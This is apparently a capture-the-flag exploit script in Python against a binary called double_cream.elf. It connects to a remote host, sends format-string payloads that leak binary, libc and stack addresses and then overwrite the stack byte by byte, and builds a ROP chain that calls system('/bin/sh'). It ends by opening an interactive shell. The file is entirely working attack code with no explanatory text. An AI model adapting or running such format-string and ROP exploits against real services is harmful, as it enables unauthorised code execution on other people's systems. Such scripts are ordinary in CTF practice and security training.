#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './double_cream.elf'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'46.101.255.206', 'port':19199})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)
offset_input1       = 0x201060
offset_input2       = offset_input1 + 0x400

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_read        = libc.sep_function['read']

#==========

def attack(conn, **kwargs):
    conn.sendlineafter('1: ', '%{}d%6$hhn bin:%1$p libc:%3$p stack:%6$p\n'.format(0x38))
    conn.sendlineafter('2: ', '%{}d%12$hhn'.format(0xe6))

    conn.recvuntil('bin:')
    binf.address    = int(conn.recvuntil(' libc:', drop=True), 16) - offset_input2
    info('addr_bin_base     = 0x{:08x}'.format(binf.address))

    addr_libc_read  = int(conn.recvuntil(' stack:', drop=True), 16) - 0x11
    libc.address = addr_libc_read - offset_libc_read
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    addr_stack      = int(conn.recvuntil('\n', drop=True), 16)
    info('addr_stack        = 0x{:08x}'.format(addr_stack))
    if addr_stack % 0x100 != 0x50:
        raise

    rop = ROP(binf)
    overwrite(conn, 0x58, rop.ret.address)
    overwrite(conn, 0x60, rop.rdi.address)
    overwrite(conn, 0x68, addr_libc_str_sh)
    overwrite(conn, 0x70, addr_libc_system)

    conn.sendlineafter('1: ', '\x00')
    conn.sendlineafter('2: ', '\x00')

def overwrite(conn, offset, value):
    for v in range(offset, offset+8):
        overwrite_byte(conn, v, value%0x100)
        value >>= 8

def overwrite_byte(conn, offset, value):
    offset %= 0x100
    value %= 0x100
    conn.sendlineafter('1: ', '%{}d%12$hhn%{}d%6$hhn\x00'.format(0x1e6, (offset+0x100-0xe6)%0x100))
    conn.sendlineafter('2: ', '%{}d%12$hhn%{}d%6$hhn\x00'.format(value+0x100, 0x138-value))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.connection.interactive()
    
#==========
